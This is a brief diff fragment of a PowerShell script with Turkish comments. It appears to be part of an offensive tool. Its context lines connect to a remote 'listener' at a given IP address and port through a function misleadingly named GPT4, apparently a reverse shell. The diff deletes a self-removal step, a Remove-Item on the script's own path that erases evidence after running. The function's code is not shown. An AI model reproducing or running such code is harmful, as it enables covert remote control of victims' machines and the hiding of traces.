@@ -54,6 +54,3 @@ if ($PSBoundParameters.Count -eq 0)
 
 # Listener'a bağlanıyoruz.
 GPT4 -IPAddress $IPAddress -Port $Port
-
-# Program otomatik olarak kapanır ve temizlenir.
-Remove-Item -Path $MyInvocation.MyCommand.Path
